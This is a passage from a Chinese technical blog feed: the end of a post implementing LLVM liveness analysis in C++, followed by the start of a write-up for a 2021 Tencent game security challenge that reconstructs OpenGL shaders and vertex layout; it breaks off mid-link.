class="line">3</span><br><span class="line">4</span><br><span class="line">5</span><br><span class="line">6</span><br><span class="line">7</span><br><span class="line">8</span><br><span class="line">9</span><br><span class="line">10</span><br><span class="line">11</span><br><span class="line">12</span><br></pre></td><td class="code"><pre><code class="hljs llvm">current bb:<br><span class="hljs-number">16</span>:                                               <span class="hljs-comment">; preds = %12</span><br>  <span class="hljs-variable">%test2</span> <span class="hljs-operator">=</span> <span class="hljs-keyword">load</span> <span class="hljs-type">i32</span><span class="hljs-punctuation">,</span> <span class="hljs-type">i32</span>* <span class="hljs-variable">%test</span><span class="hljs-punctuation">,</span> <span class="hljs-keyword">align</span> <span class="hljs-number">4</span><br>  <span class="hljs-variable">%17</span> <span class="hljs-operator">=</span> <span class="hljs-keyword">load</span> <span class="hljs-type">i32</span><span class="hljs-punctuation">,</span> <span class="hljs-type">i32</span>* <span class="hljs-variable">%5</span><span class="hljs-punctuation">,</span> <span class="hljs-keyword">align</span> <span class="hljs-number">4</span><br>  <span class="hljs-variable">%18</span> <span class="hljs-operator">=</span> <span class="hljs-keyword">add</span> <span class="hljs-keyword">nsw</span> <span class="hljs-type">i32</span> <span class="hljs-variable">%17</span><span class="hljs-punctuation">,</span> <span class="hljs-number">1</span><br>  <span class="hljs-keyword">store</span> <span class="hljs-type">i32</span> <span class="hljs-variable">%18</span><span class="hljs-punctuation">,</span> <span class="hljs-type">i32</span>* <span class="hljs-variable">%5</span><span class="hljs-punctuation">,</span> <span class="hljs-keyword">align</span> <span class="hljs-number">4</span><br>  <span class="hljs-keyword">br</span> label <span class="hljs-variable">%8</span><br><br>Before IN:<br><br>After IN:<br><span class="hljs-number">5</span> <span class="hljs-number">16</span> <br></code></pre></td></tr></table></figure><p>第二次迭代16基本块</p><figure class="highlight llvm"><table><tr><td class="gutter"><pre><span class="line">1</span><br><span class="line">2</span><br><span class="line">3</span><br><span class="line">4</span><br><span class="line">5</span><br><span class="line">6</span><br><span class="line">7</span><br><span class="line">8</span><br><span class="line">9</span><br><span class="line">10</span><br><span class="line">11</span><br><span class="line">12</span><br></pre></td><td class="code"><pre><code class="hljs llvm">current bb:<br><span class="hljs-number">16</span>:                                               <span class="hljs-comment">; preds = %12</span><br>  <span class="hljs-variable">%test2</span> <span class="hljs-operator">=</span> <span class="hljs-keyword">load</span> <span class="hljs-type">i32</span><span class="hljs-punctuation">,</span> <span class="hljs-type">i32</span>* <span class="hljs-variable">%test</span><span class="hljs-punctuation">,</span> <span class="hljs-keyword">align</span> <span class="hljs-number">4</span><br>  <span class="hljs-variable">%17</span> <span class="hljs-operator">=</span> <span class="hljs-keyword">load</span> <span class="hljs-type">i32</span><span class="hljs-punctuation">,</span> <span class="hljs-type">i32</span>* <span class="hljs-variable">%5</span><span class="hljs-punctuation">,</span> <span class="hljs-keyword">align</span> <span class="hljs-number">4</span><br>  <span class="hljs-variable">%18</span> <span class="hljs-operator">=</span> <span class="hljs-keyword">add</span> <span class="hljs-keyword">nsw</span> <span class="hljs-type">i32</span> <span class="hljs-variable">%17</span><span class="hljs-punctuation">,</span> <span class="hljs-number">1</span><br>  <span class="hljs-keyword">store</span> <span class="hljs-type">i32</span> <span class="hljs-variable">%18</span><span class="hljs-punctuation">,</span> <span class="hljs-type">i32</span>* <span class="hljs-variable">%5</span><span class="hljs-punctuation">,</span> <span class="hljs-keyword">align</span> <span class="hljs-number">4</span><br>  <span class="hljs-keyword">br</span> label <span class="hljs-variable">%8</span><br><br>Before IN:<br><span class="hljs-number">5</span> <span class="hljs-number">16</span> <br>After IN:<br><span class="hljs-number">5</span> <span class="hljs-number">14</span> <span class="hljs-number">15</span> <span class="hljs-number">16</span> <span class="hljs-number">17</span> <br></code></pre></td></tr></table></figure><p>第三次迭代16基本块</p><figure class="highlight llvm"><table><tr><td class="gutter"><pre><span class="line">1</span><br><span class="line">2</span><br><span class="line">3</span><br><span class="line">4</span><br><span class="line">5</span><br><span class="line">6</span><br><span class="line">7</span><br><span class="line">8</span><br><span class="line">9</span><br><span class="line">10</span><br><span class="line">11</span><br><span class="line">12</span><br><span class="line">13</span><br></pre></td><td class="code"><pre><code class="hljs llvm"><span class="hljs-number">3</span> iteration:<br>current bb:<br><span class="hljs-number">16</span>:                                               <span class="hljs-comment">; preds = %12</span><br>  <span class="hljs-variable">%test2</span> <span class="hljs-operator">=</span> <span class="hljs-keyword">load</span> <span class="hljs-type">i32</span><span class="hljs-punctuation">,</span> <span class="hljs-type">i32</span>* <span class="hljs-variable">%test</span><span class="hljs-punctuation">,</span> <span class="hljs-keyword">align</span> <span class="hljs-number">4</span><br>  <span class="hljs-variable">%17</span> <span class="hljs-operator">=</span> <span class="hljs-keyword">load</span> <span class="hljs-type">i32</span><span class="hljs-punctuation">,</span> <span class="hljs-type">i32</span>* <span class="hljs-variable">%5</span><span class="hljs-punctuation">,</span> <span class="hljs-keyword">align</span> <span class="hljs-number">4</span><br>  <span class="hljs-variable">%18</span> <span class="hljs-operator">=</span> <span class="hljs-keyword">add</span> <span class="hljs-keyword">nsw</span> <span class="hljs-type">i32</span> <span class="hljs-variable">%17</span><span class="hljs-punctuation">,</span> <span class="hljs-number">1</span><br>  <span class="hljs-keyword">store</span> <span class="hljs-type">i32</span> <span class="hljs-variable">%18</span><span class="hljs-punctuation">,</span> <span class="hljs-type">i32</span>* <span class="hljs-variable">%5</span><span class="hljs-punctuation">,</span> <span class="hljs-keyword">align</span> <span class="hljs-number">4</span><br>  <span class="hljs-keyword">br</span> label <span class="hljs-variable">%8</span><br><br>Before IN:<br><span class="hljs-number">5</span> <span class="hljs-number">14</span> <span class="hljs-number">15</span> <span class="hljs-number">16</span> <span class="hljs-number">17</span> <br>After IN:<br><span class="hljs-number">5</span> <span class="hljs-number">14</span> <span class="hljs-number">15</span> <span class="hljs-number">16</span> <span class="hljs-number">17</span> <br></code></pre></td></tr></table></figure><p>集合不再发生变化.</p><p>最终所有全局活跃变量的并集</p><figure class="highlight llvm"><table><tr><td class="gutter"><pre><span class="line">1</span><br><span class="line">2</span><br><span class="line">3</span><br><span class="line">4</span><br><span class="line">5</span><br><span class="line">6</span><br><span class="line">7</span><br><span class="line">8</span><br></pre></td><td class="code"><pre><code class="hljs llvm">Live Variables:<br><span class="hljs-number">0</span> <span class="hljs-type">i32</span> <span class="hljs-variable">%0</span><br><span class="hljs-number">1</span> <span class="hljs-type">i32</span> <span class="hljs-variable">%1</span><br><span class="hljs-number">5</span>   <span class="hljs-variable">%test</span> <span class="hljs-operator">=</span> <span class="hljs-keyword">alloca</span> <span class="hljs-type">i32</span><span class="hljs-punctuation">,</span> <span class="hljs-keyword">align</span> <span class="hljs-number">4</span><br><span class="hljs-number">14</span>   <span class="hljs-variable">%3</span> <span class="hljs-operator">=</span> <span class="hljs-keyword">alloca</span> <span class="hljs-type">i32</span><span class="hljs-punctuation">,</span> <span class="hljs-keyword">align</span> <span class="hljs-number">4</span><br><span class="hljs-number">15</span>   <span class="hljs-variable">%4</span> <span class="hljs-operator">=</span> <span class="hljs-keyword">alloca</span> <span class="hljs-type">i32</span><span class="hljs-punctuation">,</span> <span class="hljs-keyword">align</span> <span class="hljs-number">4</span><br><span class="hljs-number">16</span>   <span class="hljs-variable">%5</span> <span class="hljs-operator">=</span> <span class="hljs-keyword">alloca</span> <span class="hljs-type">i32</span><span class="hljs-punctuation">,</span> <span class="hljs-keyword">align</span> <span class="hljs-number">4</span><br><span class="hljs-number">17</span>   <span class="hljs-variable">%6</span> <span class="hljs-operator">=</span> <span class="hljs-keyword">alloca</span> <span class="hljs-type">i32</span><span class="hljs-punctuation">,</span> <span class="hljs-keyword">align</span> <span class="hljs-number">4</span><br></code></pre></td></tr></table></figure><p> 这给死代码删除提供了一个思路，如果某一个变量全局不活跃，并且在基本块内无引用，则为死代码可以删掉。</p><h2 id="完整代码"><a href="#完整代码" class="headerlink" title="完整代码"></a>完整代码</h2><figure class="highlight c++"><table><tr><td class="gutter"><pre><span class="line">1</span><br><span class="line">2</span><br><span class="line">3</span><br><span class="line">4</span><br><span class="line">5</span><br><span class="line">6</span><br><span class="line">7</span><br><span class="line">8</span><br><span class="line">9</span><br><span class="line">10</span><br><span class="line">11</span><br><span class="line">12</span><br><span class="line">13</span><br><span class="line">14</span><br><span class="line">15</span><br><span class="line">16</span><br><span class="line">17</span><br><span class="line">18</span><br><span class="line">19</span><br><span class="line">20</span><br><span class="line">21</span><br><span class="line">22</span><br><span class="line">23</span><br><span class="line">24</span><br><span class="line">25</span><br><span class="line">26</span><br><span class="line">27</span><br><span class="line">28</span><br><span class="line">29</span><br><span class="line">30</span><br><span class="line">31</span><br><span class="line">32</span><br><span class="line">33</span><br><span class="line">34</span><br><span class="line">35</span><br><span class="line">36</span><br><span class="line">37</span><br><span class="line">38</span><br><span class="line">39</span><br><span class="line">40</span><br><span class="line">41</span><br><span class="line">42</span><br><span class="line">43</span><br><span class="line">44</span><br><span class="line">45</span><br><span class="line">46</span><br><span class="line">47</span><br><span class="line">48</span><br><span class="line">49</span><br><span class="line">50</span><br><span class="line">51</span><br><span class="line">52</span><br><span class="line">53</span><br><span class="line">54</span><br><span class="line">55</span><br><span class="line">56</span><br><span class="line">57</span><br><span class="line">58</span><br><span class="line">59</span><br><span class="line">60</span><br><span class="line">61</span><br><span class="line">62</span><br><span class="line">63</span><br><span class="line">64</span><br><span class="line">65</span><br><span class="line">66</span><br><span class="line">67</span><br><span class="line">68</span><br><span class="line">69</span><br><span class="line">70</span><br><span class="line">71</span><br><span class="line">72</span><br><span class="line">73</span><br><span class="line">74</span><br><span class="line">75</span><br><span class="line">76</span><br><span class="line">77</span><br><span class="line">78</span><br><span class="line">79</span><br><span class="line">80</span><br><span class="line">81</span><br><span class="line">82</span><br><span class="line">83</span><br><span class="line">84</span><br><span class="line">85</span><br><span class="line">86</span><br><span class="line">87</span><br><span class="line">88</span><br><span class="line">89</span><br><span class="line">90</span><br><span class="line">91</span><br><span class="line">92</span><br><span class="line">93</span><br><span class="line">94</span><br><span class="line">95</span><br><span class="line">96</span><br><span class="line">97</span><br><span class="line">98</span><br><span class="line">99</span><br><span class="line">100</span><br><span class="line">101</span><br><span class="line">102</span><br><span class="line">103</span><br><span class="line">104</span><br><span class="line">105</span><br><span class="line">106</span><br><span class="line">107</span><br><span class="line">108</span><br><span class="line">109</span><br><span class="line">110</span><br><span class="line">111</span><br><span class="line">112</span><br><span class="line">113</span><br><span class="line">114</span><br><span class="line">115</span><br><span class="line">116</span><br><span class="line">117</span><br><span class="line">118</span><br><span class="line">119</span><br><span class="line">120</span><br><span class="line">121</span><br><span class="line">122</span><br><span class="line">123</span><br><span class="line">124</span><br><span class="line">125</span><br><span class="line">126</span><br><span class="line">127</span><br><span class="line">128</span><br><span class="line">129</span><br><span class="line">130</span><br><span class="line">131</span><br><span class="line">132</span><br><span class="line">133</span><br><span class="line">134</span><br><span class="line">135</span><br><span class="line">136</span><br><span class="line">137</span><br><span class="line">138</span><br><span class="line">139</span><br><span class="line">140</span><br><span class="line">141</span><br><span class="line">142</span><br><span class="line">143</span><br><span class="line">144</span><br><span class="line">145</span><br><span class="line">146</span><br><span class="line">147</span><br><span class="line">148</span><br><span class="line">149</span><br><span class="line">150</span><br><span class="line">151</span><br><span class="line">152</span><br><span class="line">153</span><br><span class="line">154</span><br><span class="line">155</span><br><span class="line">156</span><br><span class="line">157</span><br><span class="line">158</span><br><span class="line">159</span><br><span class="line">160</span><br><span class="line">161</span><br><span class="line">162</span><br><span class="line">163</span><br><span class="line">164</span><br><span class="line">165</span><br><span class="line">166</span><br><span class="line">167</span><br><span class="line">168</span><br><span class="line">169</span><br><span class="line">170</span><br><span class="line">171</span><br><span class="line">172</span><br><span class="line">173</span><br><span class="line">174</span><br><span class="line">175</span><br><span class="line">176</span><br><span class="line">177</span><br><span class="line">178</span><br><span class="line">179</span><br><span class="line">180</span><br><span class="line">181</span><br></pre></td><td class="code"><pre><code class="hljs c++"><span class="hljs-class"><span class="hljs-keyword">class</span> <span class="hljs-title">LivenessAnalysis</span> &#123;</span><br>    <span class="hljs-keyword">private</span>:<br>        Function * targetFunc;<br>        <span class="hljs-keyword">typedef</span> BitVector  INSTSET;<br>        <span class="hljs-keyword">typedef</span> <span class="hljs-built_in">std</span>::<span class="hljs-built_in">map</span>&lt;BasicBlock *, INSTSET&gt; BBSET;<br>        <span class="hljs-built_in">std</span>::<span class="hljs-built_in">map</span>&lt;Value*, <span class="hljs-keyword">int</span>&gt; InstBitMap;<br>        BBSET DefSet;<br>        BBSET UseSet;<br>        BBSET BBINSet;<br>        BBSET BBOUTSet;<br><br>        <span class="hljs-built_in">std</span>::<span class="hljs-built_in">vector</span>&lt;BasicBlock *&gt; bbList;<br>        <span class="hljs-function"><span class="hljs-keyword">void</span> <span class="hljs-title">PostOrderTraverse</span><span class="hljs-params">(<span class="hljs-built_in">std</span>::<span class="hljs-built_in">vector</span>&lt;BasicBlock *&gt; &amp; result, <span class="hljs-built_in">std</span>::<span class="hljs-built_in">vector</span>&lt;BasicBlock *&gt; &amp; visited, BasicBlock * curBB)</span> </span>&#123;<br>            assert(targetFunc);<br>            visited.push_back(curBB);<br>            <span class="hljs-keyword">for</span> (BasicBlock * succ : successors(curBB)) &#123;<br>                <span class="hljs-keyword">if</span> (<span class="hljs-built_in">std</span>::find(visited.begin(), visited.end(), succ) == visited.end()) &#123;<br>                    PostOrderTraverse(result, visited, succ);<br>                &#125;<br>            &#125;<br><br>            result.push_back(curBB);<br>        &#125;<br><br>        <span class="hljs-function"><span class="hljs-keyword">bool</span> <span class="hljs-title">isDefFocusInst</span><span class="hljs-params">(Value * inst)</span> </span>&#123;<br>            <span class="hljs-keyword">return</span> !dyn_cast&lt;BranchInst&gt;(inst) &amp;&amp; !dyn_cast&lt;StoreInst&gt;(inst) &amp;&amp; !dyn_cast&lt;ReturnInst&gt;(inst);<br>        &#125;<br><br>        <span class="hljs-function"><span class="hljs-keyword">void</span> <span class="hljs-title">InitializeBitVector</span><span class="hljs-params">()</span> </span>&#123;<br>            <span class="hljs-keyword">int</span> allocaCounter = <span class="hljs-number">0</span>;<br>            errs() &lt;&lt; <span class="hljs-string">&quot;BitVec map:\n&quot;</span>;<br><br>            <span class="hljs-keyword">for</span> (<span class="hljs-keyword">auto</span> arg = targetFunc-&gt;arg_begin(); arg != targetFunc-&gt;arg_end(); arg++) &#123;<br>                Value * v = dyn_cast&lt;Value&gt;(arg);<br>                InstBitMap[v] = allocaCounter;<br>                errs() &lt;&lt; allocaCounter &lt;&lt; <span class="hljs-string">&quot;  &quot;</span>;<br>                allocaCounter++;<br>                v-&gt;dump();<br>            &#125;<br><br>            <span class="hljs-keyword">for</span>(<span class="hljs-keyword">auto</span> bb : <span class="hljs-keyword">this</span>-&gt;bbList) &#123;<br>                <span class="hljs-keyword">for</span>(BasicBlock::iterator insIter = bb-&gt;begin(); insIter != bb-&gt;end(); insIter++) &#123;<br>                    Value * v = dyn_cast&lt;Value&gt;(insIter);<br>                    <span class="hljs-keyword">if</span> (isDefFocusInst(v)) &#123;<br>                        InstBitMap[v] = allocaCounter;<br>                        errs() &lt;&lt; allocaCounter;<br>                        allocaCounter++;<br>                        v-&gt;dump();<br>                    &#125;<br>                &#125;<br>            &#125;<br>            <span class="hljs-keyword">for</span>(<span class="hljs-keyword">auto</span> bb : <span class="hljs-keyword">this</span>-&gt;bbList) &#123;<br>                DefSet[bb] = BitVector(allocaCounter);<br>                UseSet[bb] = BitVector(allocaCounter);<br>                BBINSet[bb] = BitVector(allocaCounter);<br>                BBOUTSet[bb] = BitVector(allocaCounter);<br>            &#125;<br>        &#125;<br><br><br>        <span class="hljs-function"><span class="hljs-keyword">void</span> <span class="hljs-title">printSET</span><span class="hljs-params">(INSTSET &amp; <span class="hljs-built_in">set</span>)</span> </span>&#123;<br>            <span class="hljs-keyword">for</span> (<span class="hljs-keyword">int</span> i = <span class="hljs-number">0</span>; i &lt; <span class="hljs-built_in">set</span>.size(); i++) &#123;<br>                <span class="hljs-keyword">if</span> (<span class="hljs-built_in">set</span>[i]) &#123;<br>                    errs() &lt;&lt; i &lt;&lt; <span class="hljs-string">&quot; &quot;</span>;<br>                    <span class="hljs-keyword">for</span> (<span class="hljs-keyword">auto</span>  item : <span class="hljs-keyword">this</span>-&gt;InstBitMap) &#123;<br>                        <span class="hljs-keyword">if</span> (item.second == i) &#123;<br>                            item.first-&gt;dump();<br>                            <span class="hljs-keyword">break</span>;<br>                        &#125;<br>                    &#125;<br>                &#125;<br>            &#125;<br>        &#125;<br><br>        <span class="hljs-function"><span class="hljs-keyword">void</span> <span class="hljs-title">printSET2</span><span class="hljs-params">(INSTSET &amp; <span class="hljs-built_in">set</span>)</span> </span>&#123;<br>            <span class="hljs-keyword">for</span> (<span class="hljs-keyword">int</span> i = <span class="hljs-number">0</span>; i &lt; <span class="hljs-built_in">set</span>.size(); i++) &#123;<br>                <span class="hljs-keyword">if</span> (<span class="hljs-built_in">set</span>[i])<br>                    errs() &lt;&lt; i &lt;&lt; <span class="hljs-string">&quot; &quot;</span>;<br>            &#125;<br>            errs() &lt;&lt; <span class="hljs-string">&quot;\n&quot;</span>;<br>        &#125;<br><br>        <span class="hljs-function"><span class="hljs-keyword">bool</span> <span class="hljs-title">TransferBB</span><span class="hljs-params">(BasicBlock * bb)</span> </span>&#123;<br>            <span class="hljs-keyword">bool</span> changed = <span class="hljs-literal">false</span>;<br>            <span class="hljs-keyword">for</span>( BasicBlock * succ: successors(bb))<br>                <span class="hljs-keyword">this</span>-&gt;BBOUTSet[bb] |= <span class="hljs-keyword">this</span>-&gt;BBINSet[succ];<br>            BitVector bv = <span class="hljs-keyword">this</span>-&gt;UseSet[bb];<br>            BitVector df = <span class="hljs-keyword">this</span>-&gt;DefSet[bb];<br>            df.flip();<br>            df &amp;= <span class="hljs-keyword">this</span>-&gt;BBOUTSet[bb];<br>            bv |= df;<br>            <span class="hljs-keyword">if</span> (<span class="hljs-keyword">this</span>-&gt;BBINSet[bb] != bv)&#123;<br>                <span class="hljs-keyword">this</span>-&gt;BBINSet[bb] = bv;<br>                changed = <span class="hljs-literal">true</span>;<br>            &#125;<br>            <span class="hljs-keyword">return</span> changed;<br>        &#125;<br><br>    <span class="hljs-keyword">public</span>:<br>        <span class="hljs-function"><span class="hljs-keyword">explicit</span> <span class="hljs-title">LivenessAnalysis</span><span class="hljs-params">(Function * targetFunction)</span> : <span class="hljs-title">targetFunc</span><span class="hljs-params">(targetFunction)</span> </span>&#123;<br>            <span class="hljs-built_in">std</span>::<span class="hljs-built_in">vector</span>&lt;BasicBlock *&gt; tmp;<br>            <span class="hljs-keyword">this</span>-&gt;PostOrderTraverse(bbList, tmp, &amp;<span class="hljs-keyword">this</span>-&gt;targetFunc-&gt;getEntryBlock());<br>            errs() &lt;&lt; <span class="hljs-string">&quot;Baisc Block nums:&quot;</span> &lt;&lt; bbList.size() &lt;&lt; <span class="hljs-string">&quot;\n&quot;</span>;<br>            <span class="hljs-keyword">this</span>-&gt;InitializeBitVector();<br>            <span class="hljs-keyword">this</span>-&gt;AnalysisDefAndUseSet();<br>        &#125;;<br><br><br>        <span class="hljs-function"><span class="hljs-keyword">void</span> <span class="hljs-title">AnalysisDefAndUseSet</span><span class="hljs-params">()</span> </span>&#123;<br><br>            <span class="hljs-keyword">for</span>(<span class="hljs-keyword">auto</span> bb : <span class="hljs-keyword">this</span>-&gt;bbList) &#123;<br>                <span class="hljs-keyword">auto</span> &amp; defSets = <span class="hljs-keyword">this</span>-&gt;DefSet[bb];<br>                <span class="hljs-keyword">auto</span> &amp; useSets = <span class="hljs-keyword">this</span>-&gt;UseSet[bb];<br><br>                <span class="hljs-keyword">for</span>(BasicBlock::iterator insIter = bb-&gt;begin(); insIter != bb-&gt;end(); insIter++) &#123;<br>                    Value * val = dyn_cast&lt;Value&gt;(insIter);<br><br><br>                    <span class="hljs-keyword">for</span> (<span class="hljs-keyword">auto</span> &amp; op : insIter-&gt;operands()) &#123;<br>                        Value * opValue = op.get();<br><br>                        <span class="hljs-keyword">if</span> (<br>                            !dyn_cast&lt;Constant&gt;(opValue)<br>                            &amp;&amp; !dyn_cast&lt;BasicBlock&gt;(opValue)<br>                            &amp;&amp; InstBitMap.count(opValue) &gt;= <span class="hljs-number">1</span><br>                            &amp;&amp; !defSets[InstBitMap[opValue]]<br>                            &amp;&amp; !useSets[InstBitMap[opValue]]) &#123;<br>                            useSets[InstBitMap[opValue]] = <span class="hljs-literal">true</span>;<br>                        &#125;<br>                    &#125;<br><br>                    <span class="hljs-keyword">if</span> (<span class="hljs-keyword">this</span>-&gt;isDefFocusInst(val)) &#123;<br>                        defSets[InstBitMap[val]] = <span class="hljs-literal">true</span>;<br>                    &#125;<br>                &#125;<br>                errs() &lt;&lt; <span class="hljs-string">&quot;defs:\n&quot;</span>;<br>                printSET(defSets);<br>                errs() &lt;&lt; <span class="hljs-string">&quot;uses:\n&quot;</span>;<br>                printSET(useSets);<br>                errs() &lt;&lt; <span class="hljs-string">&quot;================ \n&quot;</span>;<br>            &#125;<br>        &#125;<br><br>        <span class="hljs-function"><span class="hljs-keyword">void</span> <span class="hljs-title">DoAnalysis</span><span class="hljs-params">()</span> </span>&#123;<br>            <span class="hljs-keyword">bool</span>  changed = <span class="hljs-literal">true</span>;<br>            <span class="hljs-keyword">int</span> count = <span class="hljs-number">1</span>;<br>            <span class="hljs-keyword">while</span> (changed)<br>            &#123;<br>                changed = <span class="hljs-literal">false</span>;<br>                errs() &lt;&lt; count++ &lt;&lt; <span class="hljs-string">&quot; iteration:\n&quot;</span>;<br>                <span class="hljs-keyword">for</span>( BasicBlock * bb: <span class="hljs-keyword">this</span>-&gt;bbList) &#123;<br>                    errs() &lt;&lt; <span class="hljs-string">&quot;current bb:&quot;</span>;<br>                    bb-&gt;dump();<br><br>                    errs() &lt;&lt; <span class="hljs-string">&quot;Before IN:\n&quot;</span>;<br>                    printSET2(<span class="hljs-keyword">this</span>-&gt;BBINSet[bb]);<br>                    changed |= TransferBB(bb);<br>                    errs() &lt;&lt; <span class="hljs-string">&quot;After IN:\n&quot;</span>;<br>                    printSET2(<span class="hljs-keyword">this</span>-&gt;BBINSet[bb]);<br>                    errs() &lt;&lt; <span class="hljs-string">&quot;\n\n&quot;</span>;<br>                &#125;<br>            &#125;<br>            errs() &lt;&lt; <span class="hljs-string">&quot;================== result ================\n&quot;</span>;<br>            <span class="hljs-keyword">for</span>( BasicBlock * bb: <span class="hljs-keyword">this</span>-&gt;bbList) &#123;<br>                errs() &lt;&lt; <span class="hljs-string">&quot;Basic Block:&quot;</span>;<br>                bb-&gt;dump();<br>                errs() &lt;&lt; <span class="hljs-string">&quot;IN for bb:\n&quot;</span>;<br>                printSET2(<span class="hljs-keyword">this</span>-&gt;BBINSet[bb]);<br>            &#125;<br><br>        &#125;<br><br>        <span class="hljs-function"><span class="hljs-keyword">void</span> <span class="hljs-title">FindAllLiveVariables</span><span class="hljs-params">()</span> </span>&#123;<br>            INSTSET bitmap = BitVector(InstBitMap.size());<br>            <span class="hljs-keyword">for</span> (<span class="hljs-keyword">auto</span> bb : bbList) &#123;<br>                bitmap |= BBINSet[bb];<br>            &#125;<br>            errs() &lt;&lt; <span class="hljs-string">&quot;Live Variables:\n&quot;</span>;<br>            printSET(bitmap);<br>        &#125;<br>    &#125;;<br></code></pre></td></tr></table></figure><p>调用代码</p><figure class="highlight c++"><table><tr><td class="gutter"><pre><span class="line">1</span><br><span class="line">2</span><br><span class="line">3</span><br><span class="line">4</span><br><span class="line">5</span><br><span class="line">6</span><br><span class="line">7</span><br><span class="line">8</span><br><span class="line">9</span><br></pre></td><td class="code"><pre><code class="hljs c++"><span class="hljs-function"><span class="hljs-keyword">bool</span> <span class="hljs-title">runOnFunction</span><span class="hljs-params">(Function &amp;F)</span> <span class="hljs-keyword">override</span> </span>&#123;<br>    <span class="hljs-keyword">if</span> (F.getName().compare(<span class="hljs-string">&quot;main&quot;</span>) == <span class="hljs-number">0</span>) &#123;<br>        <span class="hljs-keyword">return</span> <span class="hljs-literal">false</span>;<br>    &#125;<br>    <span class="hljs-keyword">auto</span> * live = <span class="hljs-keyword">new</span> LivenessAnalysis(&amp;F);<br>    live-&gt;DoAnalysis();<br>    live-&gt;FindAllLiveVariables();<br>    <span class="hljs-keyword">return</span> <span class="hljs-literal">false</span>;<br>&#125;<br></code></pre></td></tr></table></figure><h2 id="参考"><a href="#参考" class="headerlink" title="参考"></a>参考</h2><p>[1] <a href="https://www.bilibili.com/video/BV19741197zA?t=2059">https://www.bilibili.com/video/BV19741197zA?t=2059</a> “南京大学《软件分析》课程04（Data Flow Analysis II）”</p><p>[2] <a href="https://panda0s.top/2021/02/20/Register-Allocation/">https://panda0s.top/2021/02/20/Register-Allocation/</a> “Register Allocation”</p>]]></content>
    
    
    <categories>
      
      <category>compiler</category>
      
    </categories>
    
    
    <tags>
      
      <tag>llvm</tag>
      
      <tag>DataFlow</tag>
      
    </tags>
    
  </entry>
  
  
  
  <entry>
    <title>gslab2021: PC Security</title>
    <link href="/2021/04/05/gslab2021-PC-Security/"/>
    <url>/2021/04/05/gslab2021-PC-Security/</url>
    
    <content type="html"><![CDATA[<h1 id="2021腾讯游戏安全-初赛PC题"><a href="#2021腾讯游戏安全-初赛PC题" class="headerlink" title="2021腾讯游戏安全 初赛PC题"></a>2021腾讯游戏安全 初赛PC题</h1><p>flag:dogod<br>非常好的一道题，短短的一天时间内，已经简单入门 OpenGL </p><h2 id="1-vertex-shader"><a href="#1-vertex-shader" class="headerlink" title="1. vertex shader"></a>1. vertex shader</h2><figure class="highlight c"><table><tr><td class="gutter"><pre><span class="line">1</span><br><span class="line">2</span><br><span class="line">3</span><br><span class="line">4</span><br><span class="line">5</span><br><span class="line">6</span><br><span class="line">7</span><br><span class="line">8</span><br><span class="line">9</span><br><span class="line">10</span><br><span class="line">11</span><br><span class="line">12</span><br></pre></td><td class="code"><pre><code class="hljs c"><span class="hljs-meta">#version 330 core</span><br>layout (location = <span class="hljs-number">0</span>) in vec3 aPos;<br>layout (location = <span class="hljs-number">1</span>) in vec2 aTexCoord;<br>out vec2 TexCoord;<br>uniform mat4 model;<br>uniform mat4 view;<br>uniform mat4 projection;<br><span class="hljs-function"><span class="hljs-keyword">void</span> <span class="hljs-title">main</span><span class="hljs-params">()</span></span><br><span class="hljs-function"></span>&#123;<br>gl_Position = projection * view * model * vec4(aPos, <span class="hljs-number">1.0f</span>);<br>TexCoord = vec2(aTexCoord.x, aTexCoord.y);<br>&#125;<br></code></pre></td></tr></table></figure><h2 id="2-fragment-shader"><a href="#2-fragment-shader" class="headerlink" title="2. fragment shader"></a>2. fragment shader</h2><figure class="highlight c"><table><tr><td class="gutter"><pre><span class="line">1</span><br><span class="line">2</span><br><span class="line">3</span><br><span class="line">4</span><br><span class="line">5</span><br><span class="line">6</span><br><span class="line">7</span><br><span class="line">8</span><br><span class="line">9</span><br></pre></td><td class="code"><pre><code class="hljs c"><span class="hljs-meta">#version 330 core</span><br>out vec4 FragColor;<br>in vec2 TexCoord;<br>uniform sampler2D texture1;<br>uniform sampler2D texture2;<br><span class="hljs-function"><span class="hljs-keyword">void</span> <span class="hljs-title">main</span><span class="hljs-params">()</span></span><br><span class="hljs-function"></span>&#123;<br>FragColor = mix(texture(texture1, TexCoord), texture(texture2, TexCoord), <span class="hljs-number">0.2</span>);<br>&#125;<br></code></pre></td></tr></table></figure><h2 id="3-顶点的组成-x-y-z-Tx-Ty-理由如下"><a href="#3-顶点的组成-x-y-z-Tx-Ty-理由如下" class="headerlink" title="3. 顶点的组成: ((x,y,z), (Tx, Ty)) 理由如下"></a>3. 顶点的组成: ((x,y,z), (Tx, Ty)) 理由如下</h2><figure class="highlight apache"><table><tr><td class="gutter"><pre><span class="line">1</span><br><span class="line">2</span><br><span class="line">3</span><br><span class="line">4</span><br><span class="line">5</span><br><span class="line">6</span><br><span class="line">7</span><br><span class="line">8</span><br><span class="line">9</span><br></pre></td><td class="code"><pre><code class="hljs apache"><span class="hljs-attribute">VAO</span><br><span class="hljs-attribute">Att0</span>:<br><span class="hljs-attribute">glGenBuffers</span>(<span class="hljs-number">1</span>, &amp;VBO<span class="hljs-number">1</span>);<br><span class="hljs-attribute">glBindVertexArray</span>(VAO);<br><span class="hljs-attribute">glBindBuffer</span>(<span class="hljs-number">0</span>x<span class="hljs-number">8892</span>, VBO<span class="hljs-number">1</span>);<br><span class="hljs-attribute">glBufferData</span>(<span class="hljs-number">0</span>x<span class="hljs-number">8892</span>, <span class="hljs-number">720</span>, vertices, <span class="hljs-number">0</span>x<span class="hljs-number">88</span>E<span class="hljs-number">4</span>);<br><span class="hljs-attribute">glVertexAttribPointer</span>(<span class="hljs-number">0</span>, <span class="hljs-number">3</span>, <span class="hljs-number">0</span>x<span class="hljs-number">1406</span>, <span class="hljs-number">0</span>, <span class="hljs-number">20</span>, <span class="hljs-number">0</span>);// GL_FLOAT<br><span class="hljs-attribute">Att1</span>:<br><span class="hljs-attribute">glVertexAttribPointer</span>(<span class="hljs-number">1</span>, <span class="hljs-number">2</span>, <span class="hljs-number">0</span>x<span class="hljs-number">1406</span>, <span class="hljs-number">0</span>, <span class="hljs-number">20</span>, <span class="hljs-number">12</span>);<br></code></pre></td></tr></table></figure><h2 id="4-立方体模型数据"><a href="#4-立方体模型数据" class="headerlink" title="4. 立方体模型数据"></a>4. 立方体模型数据</h2><p>glBufferData(0x8892, 720, vertices, 0x88E4);<br>来源于：<br><a 